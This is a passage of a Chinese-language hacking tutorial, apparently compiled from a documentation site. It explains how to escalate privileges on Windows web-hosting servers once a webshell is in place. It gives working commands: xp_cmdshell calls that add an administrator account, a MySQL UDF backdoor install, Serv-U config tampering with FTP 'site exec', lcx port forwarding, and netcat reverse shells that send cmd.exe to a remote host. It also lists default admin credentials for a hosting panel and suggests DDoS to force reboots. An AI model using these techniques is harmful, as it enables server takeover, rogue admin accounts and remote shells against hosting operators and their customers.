"),t("p",[s._v("虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”")]),s._v(" "),t("p",[s._v("甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。")]),s._v(" "),t("h2",{attrs:{id:"本地溢出提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#本地溢出提权"}},[s._v("#")]),s._v(" 本地溢出提权")]),s._v(" "),t("p",[s._v("计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.")]),s._v(" "),t("p",[s._v("缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.")]),s._v(" "),t("p",[s._v("利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.")]),s._v(" "),t("p",[s._v("想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.")]),s._v(" "),t("h2",{attrs:{id:"sa提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#sa提权"}},[s._v("#")]),s._v(" sa提权")]),s._v(" "),t("p",[s._v("扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件")]),s._v(" "),t("p",[s._v("也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。")]),s._v(" "),t("p",[s._v("aspx马提权执行命令有点不一样，点击数据库管理")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("MSSQL– "),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("server")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("localhost"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("UID")])]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("sa"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t("span",{pre:!0,attrs:{class:"token environment constant"}},[s._v("PWD")])]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("database")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("master"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Provider")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("SQLOLEDB–输入帐号密码连接即可\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("增加一个用户："),t("code",[s._v("exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd /add’;–")]),s._v("\n提升为管理员："),t("code",[s._v("exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei /add’;–")])]),s._v(" "),t("p",[s._v("PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建："),t("code",[s._v("Use master dbcc addextendedproc(‘xp_cmdshell’,'xplog70.dll’)")])]),s._v(" "),t("h2",{attrs:{id:"root提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#root提权"}},[s._v("#")]),s._v(" root提权")]),s._v(" "),t("p",[s._v("利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码")]),s._v(" "),t("p",[s._v("如何判断一台windows服务器上的mysql有没有降权？\ncmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了")]),s._v(" "),t("p",[s._v("如何判断服务器上是否开启了mysql服务？\n开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.")]),s._v(" "),t("h2",{attrs:{id:"如何查看root密码"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何查看root密码"}},[s._v("#")]),s._v(" 如何查看root密码？")]),s._v(" "),t("p",[s._v("在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。\n有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。")]),s._v(" "),t("p",[s._v("可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。")]),s._v(" "),t("p",[s._v("填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。")]),s._v(" "),t("p",[s._v("注意：5.0版本以下(包括5.0的)默认c:\\windows\\系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib/plugin目录中")]),s._v(" "),t("p",[s._v("例如："),t("code",[s._v("D:/Program Files/MySQL/MySQL Server 5.1/lib/plugin/mysql.dll")])]),s._v(" "),t("p",[s._v("如果密码看不见，或是组合不到40位，就本地安装一个mysql吧，\n1、停止mysql服务\n2、替换下载下来的3个文件（user.MYI user.MYD user.frm）\n3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables\n4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root  版本不同有可能是：mysql -uroot -proot\n5、最后查询一下就出来了select user,password from mysql.user;")]),s._v(" "),t("h2",{attrs:{id:"serv-u提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#serv-u提权"}},[s._v("#")]),s._v(" serv-u提权")]),s._v(" "),t("p",[s._v("这个文件里包含serv-u的md5密码："),t("code",[s._v("C:\\Program Files\\RhinoSoft.com\\Serv-U\\\\ServUDaemon.ini")])]),s._v(" "),t("p",[s._v("找到这个文件：ServUDaemon.ini 打开找到：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("LocalSetupPassword")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("nqFCE64E0056362E8FCAF813094EC39BC2\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("再拿md5密文去解密，再用现在的密码登陆提权即可。")]),s._v(" "),t("p",[s._v("serv-u提权的前提是43958端口开了，且知道帐号密码！")]),s._v(" "),t("p",[s._v("如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。")]),s._v(" "),t("p",[s._v("530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..")]),s._v(" "),t("p",[s._v("在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。")]),s._v(" "),t("p",[s._v("目录有修改权限之serv-u提权：")]),s._v(" "),t("p",[s._v("找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！")]),s._v(" "),t("p",[s._v("接着本地cmd命令：ftp 服务器ip")]),s._v(" "),t("p",[s._v("回车，输入帐号密码再回车………………….")]),s._v(" "),t("p",[s._v("接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("Quote site "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exec")]),s._v(" net user jianmei daxia /add   增加一个用户\nQuote site "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("exec")]),s._v(" net localgroup administrators jianmei /add   提升到管理员权限\n"),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("200")]),s._v(" EXEC "),t("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("command")]),s._v(" successful "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("TID"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("33")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(".   执行成功的回显信息\n"),t("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("Maintenance")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("System   权限类型多加一行指定新加帐号为系统管理员\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[t("code",[s._v("ReloadSettings=True")]),s._v("  在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效")]),s._v(" "),t("h2",{attrs:{id:"端口转发"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#端口转发"}},[s._v("#")]),s._v(" 端口转发")]),s._v(" "),t("p",[s._v("什么情况下适合转发端口？")]),s._v(" "),t("p",[s._v("1.服务器是内网，我们无法连接。\n2.服务器上有防火墙，阻断我们的连接。")]),s._v(" "),t("p",[s._v("转发端口的前提，我们是外网或是有外网服务器。")]),s._v(" "),t("p",[s._v("找个可读可写目录上传lcx.exe")]),s._v(" "),t("p",[s._v("本地cmd命令："),t("code",[s._v("lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）")])]),s._v(" "),t("p",[s._v("接着shell命令："),t("code",[s._v("/c c:\\windows\\temp\\cookies\\lcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）")])]),s._v(" "),t("p",[s._v("之后本地连接：127.0.0.1:4567  (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)")]),s._v(" "),t("p",[s._v("以上是本机外网情况下操作，接着说下在外网服务器里如何操作：")]),s._v(" "),t("p",[s._v("上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567")]),s._v(" "),t("p",[s._v("接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。\n(( nc反弹提权 ))")]),s._v(" "),t("p",[s._v("当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。")]),s._v(" "),t("p",[s._v("不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….")]),s._v(" "),t("p",[s._v("找个可读可写目录上传nc.exe cmd.exe")]),s._v(" "),t("ul",[t("li",[s._v("-l  监听本地入栈信息")]),s._v(" "),t("li",[s._v("-p  port打开本地端口")]),s._v(" "),t("li",[s._v("-t  以telnet形式应答入栈请求")]),s._v(" "),t("li",[s._v("-e  程序重定向")])]),s._v(" "),t("p",[s._v("本地cmd执行："),t("code",[s._v("nc -vv -l -p 52 进行反弹")])]),s._v(" "),t("p",[s._v("接着在shell里执行命令："),t("code",[s._v("c:\\windows\\temp\\nc.exe -vv 服务器ip 999 -e c:\\windows\\temp\\cmd.exe")]),s._v("   最好是80或8080这样的端口，被防火墙拦截的几率小很多")]),s._v(" "),t("p",[s._v("执行成功后本地cmd命令：cd/  （只是习惯而已）")]),s._v(" "),t("p",[s._v("接着以telnet命令连接服务器：telnet 服务器ip 999")]),s._v(" "),t("p",[s._v("回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！")]),s._v(" "),t("p",[s._v("本地cmd执行："),t("code",[s._v("nc -vv -l -p 52 进行反弹")]),s._v(" "),t("code",[s._v("c:\\windows\\temp\\nc.exe -e c:\\windows\\temp\\cmd.exe 服务器ip 52")])]),s._v(" "),t("p",[s._v("shell执行命令"),t("code",[s._v("c:\\windows\\temp\\nc.exe -l -p 110 -t -e c:\\windows\\temp\\cmd.exe")])]),s._v(" "),t("p",[s._v("一般这样的格式执行成功率很小，不如直接在cmd那里输入："),t("code",[s._v("c:\\windows\\temp\\nc.exe 命令这里输入：-vv 服务器ip 999 -e c:\\windows\\temp\\cmd.exe")])]),s._v(" "),t("p",[s._v("这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的。")]),s._v(" "),t("h2",{attrs:{id:"星外提权"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#星外提权"}},[s._v("#")]),s._v(" 星外提权")]),s._v(" "),t("p",[s._v("如何知道是不是星外主机？")]),s._v(" "),t("p",[s._v("第一：网站物理路径存在“freehost”\n第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹")]),s._v(" "),t("p",[s._v("默认帐号：freehostrunat\n默认密码：fa41328538d7be36e83ae91a78a1b16f!7")]),s._v(" "),t("p",[s._v("freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可")]),s._v(" "),t("p",[s._v("星外常写目录：")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("C:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("RECYCLER"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\ne:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("recycler"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nf:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("recycler"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("php"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("PEAR"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("WINDOWS"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("7i24.com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("FreeHost\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("php"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("dev\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("System Volume Information\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("7i24.com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("serverdoctor"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("log"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("WINDOWS"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("hchiblis.ibl\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("7i24.com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("iissafe"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("log"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("7i24.com"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("LinkGate"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("log\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Thunder Network"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Thunder7"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Thunder Network"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Thunder"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Symantec AntiVirus"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("SAVRT"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("DriverPacks"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("C"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("AM2\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("FlashFXP"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Microsoft SQL Server"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("90")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Shared"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ErrorDumps"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Zend"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ZendOptimizer-3.3.0"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Common Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Documents and Settings"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("All Users"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Application Data"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Hagel Technologies"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("DU Meter"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("log.csv\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("360")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("360Safe"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("deepscan"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Section"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("mutex.db\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Helicon"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ISAPI_Rewrite3"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("error.log\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Helicon"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ISAPI_Rewrite3"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Rewrite.log\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Helicon"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ISAPI_Rewrite3"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("httpd.conf\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Common Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Symantec Shared"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Persist.bak\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Common Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Symantec Shared"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Validate.dat\nc:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Common Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Symantec Shared"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Validate.dat\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Zend"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ZendOptimizer-3.3.0"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("docs\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Documents and Settings"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("All Users"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("DRM"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Documents and Settings"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("All Users"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Application Data"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("McAfee"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("DesktopProtection\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Documents and Settings"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("All Users"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Application Data"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("360safe"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("softmgr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Program Files"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Zend"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ZendOptimizer-3.3.0"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("lib"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Optimizer-3.3.0"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("php-5.2.x"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ZendOptimizer.dll\nC:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Documents and Settings"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("All Users"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Application Data"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Microsoft"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("Media Index"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br"),t("span",{staticClass:"line-number"},[s._v("25")]),t("br"),t("span",{staticClass:"line-number"},[s._v("26")]),t("br"),t("span",{staticClass:"line-number"},[s._v("27")]),t("br"),t("span",{staticClass:"line-number"},[s._v("28")]),t("br"),t("span",{staticClass:"line-number"},[s._v("29")]),t("br"),t("span",{staticClass:"line-number"},[s._v("30")]),t("br"),t("span",{staticClass:"line-number"},[s._v("31")]),t("br"),t("span",{staticClass:"line-number"},[s._v("32")]),t("br"),t("span",{staticClass:"line-number"},[s._v("33")]),t("br"),t("span",{staticClass:"line-number"},[s._v("34")]),t("br"),t("span",{staticClass:"line-number"},[s._v("35")]),t("br")])]),t("h2",{attrs:{id:"ee提权法"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#ee提权法"}},[s._v("#")]),s._v(" ee提权法")]),s._v(" "),t("p",[s._v("找个可读可写目录上传ee.exe")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("cmd命令：/c c:"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("windows"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("temp"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("cookies"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("\\")]),s._v("ee.exe "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v("  （获取星外帐号的id值，例如回显：FreeHost 